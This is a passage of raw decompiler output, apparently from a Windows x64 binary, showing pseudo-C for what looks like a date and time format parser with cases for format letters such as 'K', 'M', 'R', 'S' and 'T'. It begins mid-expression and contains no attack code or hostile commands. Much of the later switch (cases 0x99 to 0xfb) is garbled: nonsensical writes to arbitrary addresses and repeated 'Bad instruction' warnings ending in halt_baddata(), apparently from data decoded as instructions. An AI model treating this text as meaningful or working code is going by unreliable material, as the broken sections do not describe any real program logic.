0x14003bbcd;\n                        iVar46 = (*pcVar3)(unaff_R13);\n                    }\n                    if (iVar46 == -1) {\n                        *(puVar72 + 0xc0) = 0;\n                        unaff_R13 = NULL;\n                    }\n                }\n                pcVar3 = (*unaff_R12)[2];\n                *(puVar72 + -8) = 0x14003a866;\n                cVar43 = (*pcVar3)(unaff_R12);\n                if (cVar43 == '\\0') break;\n                if (unaff_R13[2] < unaff_R13[3]) {\n                    unaff_R13[2] = unaff_R13[2] + 2;\n                }\n                else {\n                    pcVar3 = (*unaff_R13)[10];\n                    *(puVar72 + -8) = 0x14003ba02;\n                    (*pcVar3)(unaff_R13);\n                }\n                unaff_RSI = 0xffffffff;\n                *(puVar72 + 200) = 0xffff;\n            }\n            goto code_r0x000140039f81;\n        case 'K':\n            piVar66 = *(*(*(puVar72 + 0x80) + 0x10) + 0x40);\n            piVar54 = *(*(*(puVar72 + 0x80) + 0x10) + 0x48);\n            *(puVar72 + 0xe0) = piVar66;\n            *(puVar72 + 0xe8) = piVar54;\n            if ((*piVar66 == 0) || (*piVar54 == 0)) {\ncode_r0x00014003af84:\n                unaff_R13 = *(puVar72 + 0xc0);\n            }\n            else {\n                *(puVar72 + 0x30) = 2;\n                *(puVar72 + 0x90) = unaff_RDI;\n                *(puVar72 + 0x98) = *(puVar72 + 0x78);\n                *(puVar72 + 0x40) = puVar72 + 0xd8;\n                *(puVar72 + 0xa0) = *(puVar72 + 0xc0);\n                *(puVar72 + 0xa4) = *(puVar72 + 0xc4);\n                *(puVar72 + 0xa8) = *(puVar72 + 200);\n                *(puVar72 + 0xac) = *(puVar72 + 0xcc);\n                *(puVar72 + 0x38) = *(puVar72 + 0x270);\n                *(puVar72 + 0x28) = puVar72 + 0xe0;\n                *(puVar72 + 0x20) = puVar72 + 0xdc;\n                *(puVar72 + -8) = 0x14003bae2;\n                fcn.140038e30(puVar72 + 0xb0, *(puVar72 + 600), puVar72 + 0xa0, puVar72 + 0x90, *(puVar72 + 0x20), \n                              *(puVar72 + 0x28), *(puVar72 + 0x30), *(puVar72 + 0x38), *(puVar72 + 0x40), \n                              *(puVar72 + 0x48), *(puVar72 + 0x50), *(puVar72 + 0x58), *(puVar72 + 0x60), \n                              *(puVar72 + 0x68), *(puVar72 + 0x70), *(puVar72 + 0x78), *(puVar72 + 0x80));\n                unaff_R13 = *(puVar72 + 0xb0);\n                unaff_RSI = *(puVar72 + 0xb8);\n                *(puVar72 + 0xc0) = unaff_R13;\n                *(puVar72 + 200) = *(puVar72 + 0xb8);\n                *(puVar72 + 100) = *(puVar72 + 0xd8);\n                if ((*(puVar72 + 0xd8) == 0) && (*(puVar72 + 0xdc) != 0)) {\n                    *(*(puVar72 + 0x290) + 1) = *(*(puVar72 + 0x290) + 1) | 1;\n                }\n            }\n            goto code_r0x000140039f81;\n        case 'M':\n            puVar65 = puVar72 + 0xb0;\n            uVar58 = *(*(*(puVar72 + 0x80) + 0x10) + 0x50);\n            *(puVar72 + 0xa0) = *(puVar72 + 0xc0);\n            *(puVar72 + 0xa4) = *(puVar72 + 0xc4);\n            *(puVar72 + 0xa8) = *(puVar72 + 200);\n            *(puVar72 + 0xac) = *(puVar72 + 0xcc);\n            break;\n        case 'R':\n            *(puVar72 + 0x30) = 6;\n            *(puVar72 + 0x28) = 0;\n            *(puVar72 + 0x98) = *(puVar72 + 0x78);\n            *(puVar72 + 0x48) = puVar72 + 0xd8;\n            *(puVar72 + 0x38) = 1;\n            *(puVar72 + 0x40) = *(puVar72 + 0x270);\n            *(puVar72 + 0x20) = puVar72 + 0xdc;\n            *(puVar72 + 0x90) = unaff_RDI;\n            *(puVar72 + 0xa0) = *(puVar72 + 0xc0);\n            *(puVar72 + 0xa4) = *(puVar72 + 0xc4);\n            *(puVar72 + 0xa8) = *(puVar72 + 200);\n            *(puVar72 + 0xac) = *(puVar72 + 0xcc);\n            *(puVar72 + -8) = 0x14003b04a;\n            fcn.140038900(puVar72 + 0xb0, *(puVar72 + 600), puVar72 + 0xa0, puVar72 + 0x90);\n            unaff_R13 = *(puVar72 + 0xb0);\n            unaff_RSI = *(puVar72 + 0xb8);\n            *(puVar72 + 0xc0) = unaff_R13;\n            *(puVar72 + 200) = *(puVar72 + 0xb8);\n            *(puVar72 + 100) = *(puVar72 + 0xd8);\n            if (*(puVar72 + 0xd8) == 0) {\n                *(*(puVar72 + 0x280) + 0x18) = *(puVar72 + 0xdc);\n                **(puVar72 + 0x290) = **(puVar72 + 0x290) | 2;\n            }\n            goto code_r0x000140039f81;\n        case 'S':\n            pcVar53 = *(puVar72 + 0x80);\n            puVar65 = puVar72 + 0xb0;\n            puVar91 = *(puVar72 + 0xc0);\n            puVar92 = *(puVar72 + 200);\ncode_r0x00014003afaa:\n            uVar58 = *(*(pcVar53 + 0x10) + 0x10);\n            *(puVar72 + 0xa0) = puVar91;\n            *(puVar72 + 0xa8) = puVar92;\n            break;\n        case 'T':\n            *(puVar72 + 0x30) = 99;\n            *(puVar72 + 0x28) = 0;\n            *(puVar72 + 0x98) = *(puVar72 + 0x78);\n            *(puVar72 + 0x48) = puVar72 + 0xd8;\n            *(puVar72 + 0x38) = 2;\n            *(puVar72 + 0x40) = *(puVar72 + 0x270);\n            *(puVar72 + 0x20) = puVar72 + 0xdc;\n            *(puVar72 + 0x90) = unaff_RDI;\n            *(puVar72 + 0xa0) = *(puVar72 + 0xc0);\n            *(puVar72 + 0xa4) = *(puVar72 + 0xc4);\n            *(puVar72 + 0xa8) = *(puVar72 + 200);\n            *(puVar72 + 0xac) = *(puVar72 + 0xcc);\n            *(puVar72 + -8) = 0x14003b8b7;\n            fcn.140038900(puVar72 + 0xb0, *(puVar72 + 600), puVar72 + 0xa0, puVar72 + 0x90);\n            unaff_R13 = *(puVar72 + 0xb0);\n            unaff_RSI = *(puVar72 + 0xb8);\n            *(puVar72 + 0xc0) = unaff_R13;\n            *(puVar72 + 200) = *(puVar72 + 0xb8);\n            *(puVar72 + 100) = *(puVar72 + 0xd8);\n            if (*(puVar72 + 0xd8) == 0) {\n                *(*(puVar72 + 0x290) + 1) = *(*(puVar72 + 0x290) + 1) | 6;\n                bVar86 = *(puVar72 + 200) == -1;\n                if ((unaff_R13 != NULL) && (bVar86)) {\n                    if (unaff_R13[2] < unaff_R13[3]) {\n                        iVar46 = *unaff_R13[2];\n                    }\n                    else {\n                        pcVar3 = (*unaff_R13)[9];\n                        *(puVar72 + -8) = 0x14003bf8c;\n                        iVar46 = (*pcVar3)();\n                    }\n                    if (iVar46 == -1) {\n                        *(puVar72 + 0xc0) = 0;\n                    }\n                    bVar86 = iVar46 == -1;\n                }\n                cVar43 = arg1;\n                cVar77 = uVar50;\n                cVar64 = cVar43;\n                if (cVar77 != '\\0') {\n                    if (unaff_RDI[2] < unaff_RDI[3]) {\n                        iVar46 = *unaff_RDI[2];\n                    }\n                    else {\n                        pcVar3 = (*unaff_RDI)[9];\n                        *(puVar72 + -8) = 0x14003bfb1;\n                        iVar46 = (*pcVar3)(unaff_RDI);\n                    }\n                    if (iVar46 == -1) {\n                        unaff_RDI = NULL;\n                        unaff_RBP = NULL;\n                        cVar64 = cVar77;\n                    }\n                    else {\n                        cVar64 = '\\0';\n                    }\n                }\n                iVar80 = *(puVar72 + 0xdc);\n                if (bVar86 == cVar64) {\ncode_r0x00014003b930:\n                    if (iVar80 < 0x45) {\n                        iVar80 = iVar80 + 100;\n                    }\n                    unaff_R13 = *(puVar72 + 0xc0);\n                }\n                else {\n                    *(puVar72 + -8) = 0x14003bbe6;\n                    fcn.140029f90(puVar72 + 0xc0);\n                    pcVar3 = (*unaff_R12)[0xc];\n                    *(puVar72 + -8) = 0x14003bbf9;\n                    cVar64 = (*pcVar3)();\n                    if (9 < cVar64 - 0x30U) goto code_r0x00014003b930;\n                    piVar55 = *(puVar72 + 0xc0);\n                    iVar80 = (cVar64 - 0x30U) + iVar80 * 10;\n                    piVar66 = piVar55[3];\n                    if (piVar55[2] < piVar66) {\n                        piVar54 = piVar55[2] + 1;\n                        *(puVar72 + 0xdc) = iVar80;\n                        piVar55[2] = piVar54;\n                        *(puVar72 + 200) = 0xffff;\n                    }\n                    else {\n                        pcVar3 = *(*piVar55 + 0x50);\n                        *(puVar72 + -8) = 0x14003bde2;\n                        (*pcVar3)();\n                        *(puVar72 + 0xdc) = iVar80;\n                        piVar54 = piVar55[2];\n                        *(puVar72 + 200) = 0xffff;\n                        piVar66 = piVar55[3];\n                    }\n                    if (piVar54 < piVar66) {\n                        iVar46 = *piVar54;\n                    }\n                    else {\n                        pcVar3 = *(*piVar55 + 0x48);\n                        *(puVar72 + -8) = 0x14003bff1;\n                        iVar46 = (*pcVar3)();\n                    }\n                    if (iVar46 == -1) {\n                        *(puVar72 + 0xc0) = 0;\n                    }\n                    if (unaff_RBP != '\\0') {\n                        if (unaff_RDI[2] < unaff_RDI[3]) {\n                            iVar47 = *unaff_RDI[2];\n                        }\n                        else {\n                            pcVar3 = (*unaff_RDI)[9];\n                            *(puVar72 + -8) = 0x14003bfff;\n                            iVar47 = (*pcVar3)(unaff_RDI);\n                        }\n                        if (iVar47 == -1) {\n                            unaff_RDI = NULL;\n                            cVar43 = unaff_RBP;\n                        }\n                        else {\n                            cVar43 = '\\0';\n                        }\n                    }\n                    if ((iVar46 == -1) == cVar43) {\n                        unaff_R13 = *(puVar72 + 0xc0);\n                    }\n                    else {\n                        *(puVar72 + -8) = 0x14003bd43;\n                        fcn.140029f90(puVar72 + 0xc0);\n                        pcVar3 = (*unaff_R12)[0xc];\n                        *(puVar72 + -8) = 0x14003bd56;\n                        cVar43 = (*pcVar3)(unaff_R12);\n                        unaff_R13 = *(puVar72 + 0xc0);\n                        if (cVar43 - 0x30U < 10) {\n                            if (unaff_R13[2] < unaff_R13[3]) {\n                                unaff_R13[2] = unaff_R13[2] + 2;\n                            }\n                            else {\n                                pcVar3 = (*unaff_R13)[10];\n                                *(puVar72 + -8) = 0x14003bf9b;\n                                (*pcVar3)(unaff_R13);\n                                unaff_R13 = *(puVar72 + 0xc0);\n                            }\n                            *(puVar72 + 200) = 0xffff;\n                            *(puVar72 + 0xdc) = iVar80 * 10 + cVar43 + -0x30;\n                        }\n                    }\n                    iVar80 = *(puVar72 + 0xdc) + -0x76c;\n                    *(*(puVar72 + 0x290) + 1) = *(*(puVar72 + 0x290) + 1) & 0xfd;\n                }\n                *(*(puVar72 + 0x280) + 0x14) = iVar80;\n                unaff_RSI = *(puVar72 + 200);\n            }\n            goto code_r0x000140039f81;\n        }\n        *(puVar72 + 0x90) = unaff_RDI;\n        *(puVar72 + 0x38) = uVar58;\n        *(puVar72 + 0x98) = *(puVar72 + 0x78);\n        *(puVar72 + 0x40) = *(puVar72 + 0x290);\ncode_r0x00014003ab92:\n        *(puVar72 + 0x30) = *(puVar72 + 0x280);\n        *(puVar72 + 0x28) = puVar72 + 0xd8;\n        *(puVar72 + 0x20) = *(puVar72 + 0x270);\n        *(puVar72 + -8) = 0x14003abd6;\n        fcn.140039d50(puVar65, *(puVar72 + 600), puVar72 + 0xa0, puVar72 + 0x90);\n        unaff_RSI = *(puVar72 + 0xb8);\n        *(puVar72 + 0xc0) = *(puVar72 + 0xb0);\n        *(puVar72 + 200) = *(puVar72 + 0xb8);\n        *(puVar72 + 100) = *(puVar72 + 0xd8);\n        unaff_R13 = *(puVar72 + 0xb0);\n        goto code_r0x000140039f81;\n    default:\n        *ppiVar60 = *ppiVar60 + uVar44;\n        piVar55 = in_stack_00000038[1];\n        in_stack_00000058 = *in_stack_00000030;\n        in_stack_00000060 = in_stack_00000030[1];\n        unaff_RDI = *in_stack_00000038;\n        uVar59 = in_stack_00000208 + 0xd0;\n        in_stack_000001f0 = arg3;\n        fcn.1400b9790(uVar59);\n        unaff_R12 = fcn.1400b9850(uVar59);\n        sub.msvcrt.dll_wcslen(in_stack_00000220);\n        unaff_RSI = in_stack_00000060 & 0xffff;\n        arg1 = uVar59 & 0xffffffffffffff00 | piVar55 == -1;\n        in_stack_000001e8 = 0x14010b1f0;\n        puStack16 = NULL;\n        in_stack_00000070 = 0;\n        unaff_R13 = in_stack_00000058;\n        puVar67 = auStack104;\n        goto joined_r0x000140039e52;\n    case 0x97:\n    case 0xb7:\n        puVar72 = auStack104;\n        goto code_r0x00014003a4c5;\n    case 0x98:\n    case 0xb8:\n    case 0xbe:\n        goto code_r0x00014003a1d3;\n    case 0x99:\n        *ppiVar60 = *ppiVar60 + uVar44;\n        *0xc574d634 = *0xc574d634 + -0x10;\n        *unaff_RDI = *unaff_RDI >> 5 | *unaff_RDI << 3;\n        *unaff_RDI = *unaff_RDI ^ uVar51;\n        *ppiVar60 = *ppiVar60 + uVar44;\n        puVar72 = auStack104;\n        goto code_r0x00014003b25f;\n    case 0x9a:\n        pcVar53 = ppiVar60 & 0xffffffffffffffb0;\n        *pcVar53 = *pcVar53 + pcVar53;\n        arg1 = arg1 & 0xffffffffffffff00 | cVar43 + uVar87;\n        puVar72 = auStack104;\n        goto code_r0x00014003afaa;\n    case 0x9e:\n        puVar81 = unaff_RBP + -0x77;\n        cVar43 = 0xf < *puVar81;\n        *puVar81 = *puVar81 - 0x10;\n        pcVar3 = swi(0x89);\n        pcVar53 = (*pcVar3)(uVar58);\n        *(in_stack_00000030 + -0x75) = (*(in_stack_00000030 + -0x75) - puVar65) - cVar43;\n        uVar44 = pcVar53 + *pcVar53;\n        pcVar53 = (pcVar53 & 0xffffffffffffff00 | uVar44) - 0x2016fdf8;\n        *pcVar53 = *pcVar53 + uVar44;\n        out(arg3, uVar44);\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0x9f:\n        uVar59 = puStackX16 & 0xffffffff;\n        puVar72 = auStack104;\n        goto code_r0x00014003ac0e;\n    case 0xa3:\n        goto code_r0x00014003ab32;\n    case 0xa8:\n        *ppiVar60 = *ppiVar60 + uVar44;\n        puVar72 = auStack104;\n        goto code_r0x00014003aaf6;\n    case 0xa9:\n        puVar72 = auStack104;\n        if (SCARRY8(uVar59, 0x14010b1f0)) goto code_r0x00014003a9a2;\n        puVar70 = &stack0xffffffffffffff90;\n        cVar43 = '\\n';\n        do {\n            unaff_RBP = unaff_RBP + -4;\n            puVar70 = puVar70 + -1;\n            *puVar70 = *unaff_RBP;\n            cVar43 = cVar43 + -1;\n        } while ('\\0' < cVar43);\n        *(ppiVar60 + arg3 * 4) = in_FS;\n        *0x1011071d2 = *0x1011071d2 + uVar44 + *ppiVar60;\n        *0x1355a9af1 = *0x1355a9af1 >> 1 | *0x1355a9af1 << 7;\n        *0x14010b1f0 = *0x14010b1f0 + -1;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xaa:\n        *0x18c03a94c = *0x18c03a94c ^ uVar87;\n        puVar72 = auStack104;\n        goto code_r0x00014003a953;\n    case 0xab:\n        puVar72 = auStack104;\n        goto code_r0x00014003a84f;\n    case 0xad:\n        *ppiVar60 = *ppiVar60 + uVar44;\n        *(uVar59 + 0x14010b179) = *(uVar59 + 0x14010b179) + -0x10;\n        puVar72 = auStack104;\n        goto code_r0x00014003a75a;\n    case 0xae:\n        uVar59 = uVar51 + 0xd48f9;\n        puVar72 = auStack104;\n        goto code_r0x00014003b617;\n    case 0xaf:\n        goto code_r0x000140039f81;\n    case 0xb0:\n        *(unaff_RBP + 0x50042c744) = *(unaff_RBP + 0x50042c744) + -0x10;\n        pcVar53 = ppiVar60 & 0xffffffffffffffa0;\n        cVar64 = pcVar53;\n        *pcVar53 = *pcVar53 + cVar64;\n        pcVar53[-0x77] = pcVar53[-0x77] + -0x10;\n        *pcVar53 = *pcVar53 + cVar64;\n        pcVar53[-0x73] = pcVar53[-0x73] + -0x10;\n        *pcVar53 = *pcVar53 + cVar64;\n        arg1 = arg1 & 0xffffffffffffff00 | cVar43 + uVar87;\n        puVar72 = auStack104;\n        goto code_r0x00014003b3a4;\n    case 0xb9:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xba:\n    case 0xbb:\n        goto code_r0x00014003a3b0;\n    case 0xc0:\n        *ppiVar60 = *ppiVar60 + uVar44;\n        *(unaff_RBP + -0x77) = *(unaff_RBP + -0x77) + -0x10;\n        pcVar3 = swi(0x48);\n        iVar52 = (*pcVar3)(uVar58);\n        puVar72 = auStack96;\n        iVar80 = iVar52;\n        goto code_r0x00014003aec2;\n    case 0xc3:\n        goto code_r0x00014003b16a;\n    case 0xc4:\n    case 0xca:\n        puVar72 = auStack104;\n        goto code_r0x00014003a63a;\n    case 0xc6:\n        *ppiVar60 = *ppiVar60 + uVar44;\n        arg1 = arg1 & 0xffffffffffffff00 | cVar43 + uVar87;\n        puVar72 = auStack104;\n        goto code_r0x00014003ad6c;\n    case 200:\n        puVar72 = ppiVar60 & 0xffffffff;\n        pcVar53 = auStack104 & 0xffffffc0;\n        *pcVar53 = *pcVar53 + pcVar53;\n        uVar44 = *unaff_RDI;\n        *unaff_RDI = *unaff_RDI + -0x10;\n        *(puVar72 + 0xa0) = *(puVar72 + 0xa0) + arg3 + (0xf < uVar44);\n        goto code_r0x00014003ab6b;\n    case 0xcd:\n        goto code_r0x00014003add3;\n    case 0xce:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xcf:\n        *(ppiVar60 + unaff_RSI * 4) = in_FS;\n        *ppiVar60 = *ppiVar60 + uVar44;\n        *(unaff_RSI + -0x7d) = *(unaff_RSI + -0x7d) + (ppiVar60 >> 8);\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xd1:\n    case 0xe1:\n    case 0xef:\n    case 0xfd:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xd2:\n    case 0xe2:\n    case 0xf0:\n    case 0xfe:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xd3:\n    case 0xe3:\n    case 0xf1:\n    case 0xff:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xd4:\n    case 0xe4:\n    case 0xf2:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xd5:\n    case 0xe5:\n    case 0xf3:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xd6:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xd7:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xd8:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xd9:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xda:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xdb:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xdc:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xdd:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xde:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xe6:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xe7:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xe8:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xe9:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xea:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xeb:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xec:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xed:\n        *(uVar59 + 0xc910a97b) = *(uVar59 + 0xc910a97b) + -1;\n        *(uVar59 + 0xc910a97b) = *(uVar59 + 0xc910a97b) + -1;\n        *(uVar59 + 0x16910a97b) = *(uVar59 + 0x16910a97b) + -1;\n        *(uVar59 + 0xc910a97b) = *(uVar59 + 0xc910a97b) + -1;\n        *(uVar59 + 0xc910a97b) = *(uVar59 + 0xc910a97b) + -1;\n        *(uVar59 + 0xc910a97b) = *(uVar59 + 0xc910a97b) + -1;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xf4:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xf5:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xf6:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xf7:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xf8:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xf9:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xfa:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xfb:\n        *ppiVar60 = *ppiVar60 + uVar44;\n        uVar82 = *ppiVar60;\n        *ppiVar60 = *ppiVar60 + uVar44;\n        uVar42 = *0xe00000000140115e;\n        puVar81 = ppiVar60 & 0xffffffffffffff00 | *0xe00000000140115e;\n        *(puVar81 + 1) = *(puVar81 + 1) + puVar81 + CARRY1(uVar82, uVar44);\n        *puVar81 = *puVar81 + uVar42;\n        uVar44 = *puVar81;\n        *puVar81 = *puVar81 + uVar87;\n        *(puVar81 + 1) = *(puVar81 + 1) + puVar81 + CARRY1(uVar44, uVar87);\n        *puVar81 = *puVar81 + uVar42;\n        *puVar81 = *puVar81 + uVar42;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    if (arg1[2] < arg1[3]) {\n        iVar46 = *arg1[2];\n    }\n    else {\n        pcVar3 = (*arg1)[9];\n        *(puVar56 + -8) = 0x140041372;\n        iVar46 = (*pcVar3)(arg1);\n    }\n    bVar86 = false;\n    if (iVar46 == -1) {\n        arg1 = NULL;\n        bVar86 = bVar89;\n    }\ncode_r0x0001400408d8:\n    bVar89 = *(puVar56 + 0xa0) == -1;\n    if ((unaff_RBP != NULL) && (bVar89)) {\n        if (unaff_RBP[2] < unaff_RBP[3]) {\n            iVar46 = *unaff_RBP[2];\n        }\n        else {\n            pcVar3 = *(*unaff_RBP + 0x48);\n            *(puVar56 + -8) = 0x14004138f;\n            iVar46 = (*pcVar3)(unaff_RBP);\n        }\n        bVar89 = iVar46 == -1;\n    }\n    if (bVar89 == bVar86) {\n        **(puVar56 + 0x178) = **(puVar56 + 0x178) | 2;\n    }\n    iVar52 = *(puVar56 + 0xe0);\n    ppiVar63 = *(puVar56 + 0x150);\n    ppiVar63[1] = *(puVar56 + 0x98) & 0xffffffffffff0000 | uVar49;\n    iVar57 = *(puVar56 + 0x50);\n    *ppiVar63 = arg1;\n    if (iVar52 != iVar57) {\n        *(puVar56 + -8) = 0x140040934;\n        fcn.1400bc6c0();\n    }\n    if (*(puVar56 + 0xc0) != *(puVar56 + 0x68)) {\n        *(puVar56 + -8) = 0x14004094b;\n        fcn.1400bc6c0();\n    }\n    return *(puVar56 + 0x150);\ncode_r0x000140039ec7:\n    pcVar3 = (*unaff_R12)[2];\n    *(puVar72 + -8) = 0x140039eda;\n    cVar43 = (*pcVar3)(unaff_R12);\n    unaff_R13 = *(puVar72 + 0xc0);\n    if (cVar43 != '\\0') {\n        unaff_R14 = NULL;\n        do {\n            uVar87 = unaff_RSI == -1;\n            uVar44 = unaff_R13 != NULL && uVar87;\n            puVar69 = puVar72;\n            if (unaff_R13 != NULL && uVar87) {\n                if (unaff_R13[2] < unaff_R13[3]) {\n                    iVar46 = *unaff_R13[2];\n                }\n                else {\n                    piVar55 = *unaff_R13;\n                    *(puVar72 + 0x70) = uVar44;\n                    pcVar3 = piVar55[9];\n                    *(puVar72 + -8) = 0x14003a35e;\n                    iVar46 = (*pcVar3)(unaff_R13);\n                    uVar44 = *(puVar72 + 0x70);\n                }\n                arg3 = uVar44;\n                uVar87 = false;\n                if (iVar46 != -1) goto code_r0x00014003a138;\ncode_r0x00014003a1d3:\n                uVar87 = arg3;\n                unaff_R13 = NULL;\n                uVar44 = 0;\n                *(puVar69 + 0xc0) = 0;\n                uVar82 = unaff_RDI != NULL & arg1;\n                puVar72 = puVar69;\n                uVar42 = 0;\n                if (uVar82 == 0) goto code_r0x00014003a148;\ncode_r0x00014003a200:\n                uVar44 = uVar42;\n                if (unaff_RDI[2] < unaff_RDI[3]) {\n                    iVar46 = *unaff_RDI[2];\n                }\n                else {\n                    piVar55 = *unaff_RDI;\n                    puVar69[0x70] = uVar44;\n                    pcVar3 = piVar55[9];\n                    *(puVar69 + -8) = 0x14003a345;\n                    iVar46 = (*pcVar3)(unaff_RDI);\n                    uVar44 = puVar69[0x70];\n                }\n                puVar72 = puVar69;\n                if (iVar46 == -1) {\n                    unaff_RDI = NULL;\n                }\n                else {\n                    uVar82 = unaff_R14;\n                }\n            }\n            else {\ncode_r0x00014003a138:\n                uVar82 = unaff_RDI != NULL & arg1;\n                uVar42 = uVar44;\n                if (uVar82 != 0) goto code_r0x00014003a200;\ncode_r0x00014003a148:\n                uVar82 = arg1;\n            }\n            if (uVar87 == uVar82) goto code_r0x000140039f81;\n            if (uVar44 != 0) {\n                if (unaff_R13[2] < unaff_R13[3]) {\n                    iVar46 = *unaff_R13[2];\n                }\n                else {\n                    pcVar3 = (*unaff_R13)[9];\n                    *(puVar72 + -8) = 0x14003a38a;\n                    iVar46 = (*pcVar3)(unaff_R13);\n                }\n                if (iVar46 == -1) {\n                    *(puVar72 + 0xc0) = 0;\n                    unaff_R13 = NULL;\n                }\n            }\n            pcVar3 = (*unaff_R12)[2];\n            *(puVar72 + -8) = 0x14003a16e;\n            cVar43 = (*pcVar3)(unaff_R12);\n            if (cVar43 == '\\0') goto code_r0x000140039f81;\n            if (unaff_R13[2] < unaff_R13[3]) {\n                unaff_R13[2] = unaff_R13[2] + 2;\n            }\n            else {\n                pcVar3 = (*unaff_R13)[10];\n                *(puVar72 + -8) = 0x14003a29a;\n                (*pcVar3)(unaff_R13);\n            }\n            unaff_RSI = 0xffffffff;\n            *(puVar72 + 200) = 0xffff;\n        } while( true );\n    }\n    uVar87 = unaff_R13 != NULL;\n    pcVar3 = (*unaff_R12)[8];\n    *(puVar72 + -8) = 0x140039eff;\n    uVar45 = (*pcVar3)(unaff_R12);\n    *(puVar72 + 0x70) = uVar45;\n    uVar82 = uVar44 & uVar87;\n    if (uVar82 != 0) {\n        if (unaff_R13[2] < unaff_R13[3]) {\n            iVar46 = *unaff_R13[2];\n            uVar87 = uVar82;\n        }\n        else {\n            piVar55 = *unaff_R13;\n            *(puVar72 + 0x88) = uVar82;\n            pcVar3 = piVar55[9];\n            *(puVar72 + -8) = 0x14003ba19;\n            iVar46 = (*pcVar3)(unaff_R13);\n            uVar87 = *(puVar72 + 0x88);\n        }\n        if (iVar46 == -1) {\n            *(puVar72 + 0xc0) = 0;\n            uVar87 = 0;\n            unaff_R13 = NULL;\n        }\n    }\n    pcVar3 = (*unaff_R12)[8];\n    *(puVar72 + -8) = 0x140039f1d;\n    iVar46 = (*pcVar3)(unaff_R12);\n    if (*(puVar72 + 0x70) != iVar46) {\n        pcVar3 = (*unaff_R12)[6];\n        *(puVar72 + -8) = 0x140039f36;\n        iVar46 = (*pcVar3)(unaff_R12);\n        if ((uVar44 != 0) && (uVar87 != 0)) {\n            if (unaff_R13[2] < unaff_R13[3]) {\n                iVar47 = *unaff_R13[2];\n            }\n            else {\n                pcVar3 = (*unaff_R13)[9];\n                *(puVar72 + -8) = 0x14003a8ee;\n                iVar47 = (*pcVar3)(unaff_R13);\n            }\n            if (iVar47 == -1) {\n                *(puVar72 + 0xc0) = 0;\n            }\n        }\n        pcVar3 = (*unaff_R12)[6];\n        *(puVar72 + -8) = 0x140039f54;\n        iVar47 = (*pcVar3)(unaff_R12);\n        unaff_R13 = *(puVar72 + 0xc0);\n        if (iVar46 != iVar47) {\ncode_r0x000140039f66:\n            *(puVar72 + 100) = 4;\n            *(puVar72 + 0xd8) = 4;\n            unaff_R13 = *(puVar72 + 0xc0);\n            goto code_r0x000140039f81;\n        }\n    }\ncode_r0x00014003a100:\n    if (unaff_R13[2] < unaff_R13[3]) {\n        unaff_R13[2] = unaff_R13[2] + 2;\n    }\n    else {\n        pcVar3 = (*unaff_R13)[10];\n        *(puVar72 + -8) = 0x14003a37a;\n        (*pcVar3)(unaff_R13);\n    }\n    unaff_RSI = 0xffffffff;\n    *(puVar72 + 200) = 0xffff;\n    goto code_r0x000140039f81;\ncode_r0x00014003a6a9:\n    arg3 = *(puVar72 + 600);\n    in_stack_00000038 = puVar72 + 0x90;\n    puVar65 = puVar72 + 0xb0;\n    in_stack_00000030 = puVar72 + 0xa0;\n    iVar52 = *(*(puVar72 + 0x80) + 0x10);\n    in_XMM1_Da = *(iVar52 + 0xa8);\n    in_XMM1_Db = *(iVar52 + 0xac);\n    in_XMM1_Dc = *(iVar52 + 0xb0);\n    in_XMM1_Dd = *(iVar52 + 0xb4);\n    in_XMM5_Da = *(iVar52 + 0x68);\n    in_XMM5_Db = *(iVar52 + 0x6c);\n    in_XMM5_Dc = *(iVar52 + 0x70);\n    in_XMM5_Dd = *(iVar52 + 0x74);\n    in_XMM4_Da = *(iVar52 + 0x78);\n    in_XMM4_Db = *(iVar52 + 0x7c);\n    in_XMM4_Dc = *(iVar52 + 0x80);\n    in_XMM4_Dd = *(iVar52 + 0x84);\n    in_XMM3_Da = *(iVar52 + 0x88);\n    in_XMM3_Db = *(iVar52 + 0x8c);\n    in_XMM3_Dc = *(iVar52 + 0x90);\n    in_XMM3_Dd = *(iVar52 + 0x94);\n    puVar91 = *(iVar52 + 0x98);\n    puVar92 = *(iVar52 + 0xa0);\n    auVar90 = 